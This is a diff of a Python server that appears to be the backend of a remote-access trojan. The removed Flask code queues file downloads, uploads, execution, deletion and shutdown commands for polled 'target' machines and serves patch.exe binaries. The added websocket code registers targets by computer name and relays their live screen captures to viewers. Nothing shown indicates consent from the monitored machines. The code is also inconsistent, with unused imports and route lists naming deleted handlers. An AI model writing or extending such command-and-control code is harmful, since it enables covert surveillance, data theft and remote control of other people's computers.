@@ -1,16 +1,19 @@
-from flask import Flask, render_template, request, jsonify, redirect, url_for,send_from_directory,Response
+from flask import Flask, request, jsonify, redirect, url_for,Response
 import time
 import threading
 import os
+import threading
+import base64
+import tkinter as tk
+from tkinter import messagebox, ttk
+from io import BytesIO
+from PIL import Image, ImageTk
+import asyncio
+import json
+import logging
+import websockets
 
-from werkzeug.utils import secure_filename
 VERSION_FILE = os.path.join(os.path.abspath(os.path.dirname(__file__)), "version.txt")
-
-# Temporary local directory to buffer file downloads coming from targets
-DOWNLOAD_CACHE_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "download_cache")
-if not os.path.exists(DOWNLOAD_CACHE_DIR):
-    os.makedirs(DOWNLOAD_CACHE_DIR)
-
 def get_current_version():
     if not os.path.exists(VERSION_FILE):
         with open(VERSION_FILE, "w") as f:
@@ -18,20 +21,12 @@ def get_current_version():
         return "1"
     with open(VERSION_FILE, "r") as f:
         return f.read().strip()
-
 def save_version(number):
     with open(VERSION_FILE, "w") as f:
         f.write(str(number).strip())
-# --- CONFIGURATION ---
-# Define the directory where patches will be stored
 PATCH_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "patches")
-
-# Ensure the directory exists when the server starts
 if not os.path.exists(PATCH_DIR):
     os.makedirs(PATCH_DIR)
-
-
-# --- NEW ROUTE HOOKS ---
 
 app = Flask(__name__)
 liveusers = {}
@@ -42,10 +37,6 @@ class LiveUser:
         self.lastinput = time.time()
         self.is_alive = True
         self.current_frame = None  
-        self.current_files = []        # List of items inside the currently viewed directory: [{"name": "x", "is_directory": True/False}]
-        self.viewing_directory = "/"    # Tracks the exact directory path the user is viewing
-        self.pending_command = None    # Stores general system control functions (Shutdown/Restart)
-        self.pending_file_ops = []     # Queues dynamic file manager operations for the client to grab
         
         print(f"Live session initialized for {address}")
         self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
@@ -92,7 +83,7 @@ with open(KEY_FILE, "r") as f:
 @app.before_request
 def restrict_access():
     # These must match the exact def names of your functions
-    allowed_routes = ["login", "submit_key", "live", "patch_upload", "get_patch","get_patch_version","request_download", "receive_download", "retrieve_file"]
+    allowed_routes = ["login", "submit_key", "live", "get_patch","get_patch_version","request_download", "receive_download", "retrieve_file"]
     
     if request.endpoint in allowed_routes:
         return
@@ -108,50 +99,6 @@ def get_patch_version():
         "status": "success",
         "patch_number": current_ver
     })
-
-# 1. UI triggers this to tell the client: "Hey, prepare this file"
-@app.route("/files/<address>/download", methods=["POST"])
-def request_download(address):
-    user = liveusers.get(address)
-    if not user:
-        return jsonify({"status": "error", "message": "User offline"}), 404
-        
-    data = request.get_json() or {}
-    filename = data.get("target")
-    
-    # Queue the operation down to the client's loop
-    user.pending_file_ops.append({
-        "op": "download",
-        "target": filename
-    })
-    return jsonify({"status": "queued", "message": f"Requested download for {filename}"})
-
-
-# 2. Client hits this to hand over the file data
-@app.route("/files/<address>/receive_download", methods=["POST"])
-def receive_download(address):
-    if "file" not in request.files:
-        return jsonify({"status": "error", "message": "Missing payload data"}), 400
-        
-    file_payload = request.files["file"]
-    if file_payload.filename == "":
-        return jsonify({"status": "error", "message": "Missing file naming convention"}), 400
-
-    # Ensure unique directories per address so files don't overwrite each other
-    target_user_dir = os.path.join(DOWNLOAD_CACHE_DIR, secure_filename(address))
-    if not os.path.exists(target_user_dir):
-        os.makedirs(target_user_dir)
-        
-    safe_name = secure_filename(file_payload.filename)
-    file_payload.save(os.path.join(target_user_dir, safe_name))
-    return jsonify({"status": "success", "message": "Data transferred successfully"})
-
-
-# 3. Web UI checks this endpoint via a link to fetch the buffered file
-@app.route("/files/<address>/retrieve/<filename>", methods=["GET"])
-def retrieve_file(address, filename):
-    target_user_dir = os.path.join(DOWNLOAD_CACHE_DIR, secure_filename(address))
-    return send_from_directory(target_user_dir, secure_filename(filename), as_attachment=True)
 
 @app.route("/patch", methods=["GET", "POST"])
 def patch_upload():
@@ -239,211 +186,86 @@ def get_patch():
     print(f"[Server] Streaming patch.exe raw binary ({file_size} bytes) directly to client...")
     return response
 
-# --- FILE MANAGER DATA SYNC & STATE MANIPULATION ---
+# Setup basic logging to monitor connections on the Render dashboard
+logging.basicConfig(level=logging.INFO)
 
-@app.route("/files/<address>/list", methods=["GET"])
-def list_files(address):
-    thisip = str(address)
-    if thisip not in liveusers:
-        liveusers[thisip] = LiveUser(address=thisip)
-        
-    user = liveusers[thisip]
-    return jsonify({
-        "status": "success", 
-        "files": user.current_files,
-        "viewing_directory": user.viewing_directory
-    })
+# Global states
+live_targets = {}     # Store active targets: { "Target-PC": websocket_connection }
+connected_viewers = set() # Set of all active viewer dashboard websockets
 
-@app.route("/files/<address>/navigate", methods=["POST"])
-def navigate_directory(address):
-    user = liveusers.get(address)
-    if not user:
-        return jsonify({"status": "error", "message": "User offline"}), 404
-        
-    data = request.get_json() or {}
-    destination = data.get("destination")
-    
-    # Appends a navigation directive to the client command loop
-    user.pending_file_ops.append({
-        "op": "navigate",
-        "destination": destination
-    })
-    return jsonify({"status": "success", "queued": "navigate"})
+async def handle_client(websocket):
+    client_type = None
+    target_name = None
+    addr = websocket.remote_address
+    logging.info(f"New connection established from {addr}")
 
+    try:
+        async for message in websocket:
+            payload = json.loads(message)
+            msg_type = payload.get("type")
 
-# --- COMPONENT IMPLEMENTATION ROUTE HOOKS ---
+            # --- 1. REGISTRATION PHASE ---
+            if msg_type == "register_viewer":
+                client_type = "viewer"
+                connected_viewers.add(websocket)
+                logging.info(f"Viewer registered from {addr}")
+                
+                # Send current live targets list immediately upon joining
+                current_list = list(live_targets.keys())
+                await websocket.send(json.dumps({"type": "list", "data": current_list}))
 
-@app.route("/files/<address>/upload", methods=["POST"])
-def upload_file(address):
-    user = liveusers.get(address)
-    if "file" not in request.files:
-        return jsonify({"status": "error", "message": "No file chunk passed"})
-    
-    file_payload = request.files["file"]
-    
-    # Files are data-heavy, so instead of queuing a command, we can notify the client 
-    # about an incoming file payload structure by dropping it into the task loop.
-    user.pending_file_ops.append({
-        "op": "upload",
-        "filename": file_payload.filename,
-        "raw_bytes": file_payload.read().hex() # Convert to string format safe for transmission
-    })
-    return jsonify({"status": "queued", "filename": file_payload.filename})
+            elif msg_type == "register_target":
+                client_type = "target"
+                target_name = payload.get("COMPUTERNAME", f"Target-{addr[1]}")
+                live_targets[target_name] = websocket
+                logging.info(f"Target registered: {target_name}")
 
-@app.route("/files/<address>/create_dir", methods=["POST"])
-def create_directory(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    folder_name = data.get("name")
-    
-    user.pending_file_ops.append({
-        "op": "create_dir", 
-        "name": folder_name
-    })
-    return jsonify({"status": "queued"})
+                # Alert all active viewers that a new target is online
+                await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
 
-@app.route("/files/<address>/rename", methods=["POST"])
-def rename_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "rename", 
-        "old_name": data.get("old_name"), 
-        "new_name": data.get("new_name")
-    })
-    return jsonify({"status": "queued"})
+            # --- 2. DATA STREAM RELAY PHASE ---
+            elif msg_type == "stream_frame" and client_type == "target":
+                frame_data = payload.get("frame")
+                
+                # package frame and relay out to all viewers
+                relay_payload = {
+                    "type": "frame",
+                    "user": target_name,
+                    "frame": frame_data
+                }
+                await broadcast_to_viewers(relay_payload)
+                
+                # Send acknowledgement response back to the target client
+                await websocket.send(json.dumps({"status": "OK"}))
 
-@app.route("/files/<address>/move", methods=["POST"])
-def move_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "move", 
-        "target": data.get("target"), 
-        "dest": data.get("dest")
-    })
-    return jsonify({"status": "queued"})
+    except websockets.ConnectionClosed:
+        logging.info(f"Connection closed normally for {addr}")
+    except Exception as e:
+        logging.error(f"Error handling connection {addr}: {e}")
+    finally:
+        # --- 3. CLEANUP DISCONNECTED INSTANCES ---
+        if websocket in connected_viewers:
+            connected_viewers.remove(websocket)
+        if client_type == "target" and target_name in live_targets:
+            del live_targets[target_name]
+            logging.info(f"Target offline: {target_name}")
+            # Update target listbox for all remaining viewers
+            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
 
-@app.route("/files/<address>/delete", methods=["POST"])
-def delete_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "delete", 
-        "target": data.get("target")
-    })
-    return jsonify({"status": "queued"})
+async def broadcast_to_viewers(payload_dict):
+    """Helper utility to push messages to all active viewers concurrently."""
+    if not connected_viewers:
+        return
+    message = json.dumps(payload_dict)
+    # Gather tasks to fire them off in parallel safely
+    await asyncio.gather(*[viewer.send(message) for viewer in connected_viewers], return_exceptions=True)
 
-@app.route("/files/<address>/run", methods=["POST"])
-def run_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "run", 
-        "target": data.get("target")
-    })
-    return jsonify({"status": "queued"})
-
-@app.route("/files/<address>/zip", methods=["POST"])
-def zip_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "zip", 
-        "target": data.get("target")
-    })
-    return jsonify({"status": "queued"})
-
-@app.route("/files/<address>/unzip", methods=["POST"])
-def unzip_item(address):
-    user = liveusers.get(address)
-    data = request.get_json() or {}
-    
-    user.pending_file_ops.append({
-        "op": "unzip", 
-        "target": data.get("target")
-    })
-    return jsonify({"status": "queued"})
-
-
-# --- STANDARD TEMPLATE RENDERS ---
-
-@app.route("/login", methods=["GET", "POST"])
-def login():
-    if request.method == "POST":
-        entered_key = request.form.get("auth_key", "").strip()
-        if entered_key == SITE_SECRET_KEY:
-            response = redirect(url_for("home"))
-            response.set_cookie("site_access_token", SITE_SECRET_KEY, httponly=True)
-            return response
-        return redirect(url_for("login", error=1))
-    
-    return """
-    <!DOCTYPE html>
-    <html><head><title>Access Required</title><style>body{background:#0d0e15;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.login-box{background:#1a1c2e;padding:30px;border-radius:8px;border:1px solid #2e3152;text-align:center;}input{background:#0d0e15;border:1px solid #3b82f6;color:white;padding:12px;border-radius:4px;width:200px;margin-bottom:15px;text-align:center;}button{background:#3b82f6;color:white;border:none;padding:12px 24px;border-radius:4px;cursor:pointer;width:100%;font-size:1rem;}</style></head>
-    <body><div class="login-box"><h2>ENTER ACCESS KEY</h2><form action="/login" method="POST"><input type="password" name="auth_key" placeholder="Key string..." required autocomplete="off"><br><button type="submit">VALIDATE</button></form></div></body></html>
-    """
-
-@app.route("/")
-def home():
-    return render_template("index.html", users=liveusers.keys())
-
-@app.route("/watch/<address>")
-def watch(address):
-    return render_template("watch.html", address=address)
-
-@app.route("/stream_data/<address>")
-def stream_data(address):
-    user = liveusers.get(address)
-    if user and user.current_frame:
-        return jsonify({"image": user.current_frame})
-    return jsonify({"image": ""})
-
-@app.route("/control/<address>", methods=["POST"])
-def control(address):
-    user = liveusers.get(address)
-    if not user: return jsonify({"status": "error"}), 404
-    data = request.get_json() or {}
-    user.pending_command = data.get("action")
-    return jsonify({"status": "success"})
-
-
-# --- TRANSMISSION RECEIVER ---
-
-@app.route("/live", methods=["POST"])
-def live():
-    client_data = request.get_json() or {}
-    thisip = str(get_ip())
-    frame_data = client_data.get("frame") 
-    
-    file_data = client_data.get("directory_items", [])
-    client_current_dir = client_data.get("current_directory", "/")
-
-    if thisip not in liveusers:
-        liveusers[thisip] = LiveUser(address=thisip)
-        
-    user = liveusers[thisip]
-    user.viewing_directory = client_current_dir
-    user.ping(frame_data=frame_data, frame_files=file_data)
-
-    # Pop tracking operations out to dispatch down to the home client script
-    command_to_send = user.pending_command
-    user.pending_command = None 
-    
-    ops_to_send = list(user.pending_file_ops)
-    user.pending_file_ops.clear()
-    
-    return jsonify({
-        "status": "success",
-        "command": command_to_send,
-        "file_operations": ops_to_send,  # <--- Array containing your structured tasks
-        "address":thisip,
-    })
+async def main():
+    # Render assigns an environment variable named PORT dynamically (defaults to 10000)
+    port = int(os.environ.get("PORT", 10000))
+    logging.info(f"Starting server engine on port {port}...")
+    async with websockets.serve(handle_client, "0.0.0.0", port):
+        await asyncio.Future() # Run server indefinitely
 
 if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    asyncio.run(main())
